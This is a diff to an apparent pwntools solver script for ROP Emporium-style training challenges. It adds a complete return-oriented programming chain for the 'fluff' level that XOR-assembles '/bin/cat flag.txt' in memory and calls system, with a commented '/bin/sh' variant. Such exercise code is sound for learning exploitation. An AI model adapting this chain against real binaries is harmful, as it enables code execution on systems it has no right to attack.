@@ -138,7 +138,7 @@ def write4(path):
 
     p = process(path)
     p.sendline(payload)
-    fluff = p.recv()
+    fluff_ = p.recv()
     flag = p.recvline()
     #p.interactive()
     success(flag)
@@ -253,14 +253,90 @@ def badchars(path):
 
     p = process(path)
     p.sendline(payload)
-    fluff = p.recv()
+    fluff_ = p.recv()
     flag = p.recvline()
     success(flag)
     return True
 
 
-def fluff():
-    pass
+def fluff(path):
+
+    # .bss section address
+    #write_dest = 0x0000000000601060
+
+    # Fill buffer
+    payload = b''
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'
+    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42'
+
+    # Round 1
+    # set r10 = 0x00601060 (.bss)
+    payload += b'\x45\x08\x40\x00\x00\x00\x00\x00'  # mov r11, 602050; ret
+    payload += b'\x32\x08\x40\x00\x00\x00\x00\x00'  # pop r12; mov r13, junk; ret
+    payload += b'\x30\x30\x00\x00\x00\x00\x00\x00'  # xorkey = 0x3030; (0x602050^0x3030=0x601060)
+    payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk;ret
+    payload += b'\x7f\x42\x09\x6e\x2f\x63\x61\x74'  # xorkey 2 (tac/nib/ ^ 602050)
+    #payload += b'\x7f\x42\x09\x6e\x2f\x73\x68\x00'  # xorkey 2 (\x00hs/nib/ ^ 602050)
+    payload += b'\x40\x08\x40\x00\x00\x00\x00\x00'  # xchg r10, r11; pop r15; mov r11, 602050; ret
+    payload += b'junk1234'
+    # set r11="/bin/cat"
+    payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk; ret
+    payload += b'junk5678'
+    payload += b'\x4e\x08\x40\x00\x00\x00\x00\x00'  # mov [r10], r11; pop r13; pop r12; ret
+    payload += b'junk9abc'
+    payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # neutralize the xor r12
+
+    # Round 2
+    # set r10 = .bss+8
+    payload += b'\x45\x08\x40\x00\x00\x00\x00\x00'  # mov r11, 602050; ret
+    payload += b'\x32\x08\x40\x00\x00\x00\x00\x00'  # pop r12; mov r13, junk; ret
+    payload += b'\x38\x30\x00\x00\x00\x00\x00\x00'  # xorkey = 0x3030; (0x602050^0x3030=0x601060)
+    payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk; ret
+    payload += b'\x70\x46\x0c\x61\x67\x2e\x74\x78'  # xorkey 2 ("xt.galf " ^ 602050)
+    payload += b'\x40\x08\x40\x00\x00\x00\x00\x00'  # xchg r10, r11; pop r15; mov r11, 602050; ret
+    payload += b'junk1234'
+    # set r11=" flag.tx"
+    payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk; ret
+    payload += b'junk5678'
+    payload += b'\x4e\x08\x40\x00\x00\x00\x00\x00'  # mov [r10], r11; pop r13; pop r12; ret
+    payload += b'junk9abc'
+    payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # neutralize the xor r12
+
+    # Round 3
+    # set r10 = .bss+0x10
+    payload += b'\x45\x08\x40\x00\x00\x00\x00\x00'  # mov r11, 602050; ret
+    payload += b'\x32\x08\x40\x00\x00\x00\x00\x00'  # pop r12; mov r13, junk; ret
+    payload += b'\x20\x30\x00\x00\x00\x00\x00\x00'  # xorkey = 0x3030; (0x602050^0x3030=0x601060)
+    payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk; ret
+    payload += b'\x24\x20\x60\x00\x00\x00\x00\x00'  # xorkey 2 (t ^ 602050)
+    payload += b'\x40\x08\x40\x00\x00\x00\x00\x00'  # xchg r10, r11; pop r15; mov r11, 602050; ret
+    payload += b'junk1234'
+    # set r11="t\x00"
+    payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk; ret
+    payload += b'junk5678'
+    payload += b'\x4e\x08\x40\x00\x00\x00\x00\x00'  # mov [r10], r11; pop r13; pop r12; ret
+    payload += b'junk9abc'
+    payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # neutralize the xor r12
+
+    # call system
+    payload += b'\xc3\x08\x40\x00\x00\x00\x00\x00'  # pop edi; ret
+    payload += b'\x60\x10\x60\x00\x00\x00\x00\x00'  # ->"/bin/cat flag.txt"
+    #payload += b'\x10\x08\x40\x00\x00\x00\x00\x00'  # call _system(): fails but dunno why
+    payload += b'\xe0\x05\x40\x00\x00\x00\x00\x00'  # plt.system
+
+    #with open("payload_fluff", "wb") as f:
+        #f.write(payload)
+
+    p = process(path)
+    p.sendline(payload)
+    fluff_ = p.recv()
+    flag = p.recvline()
+    success(flag)
+
+    return True
 
 
 def pivot():
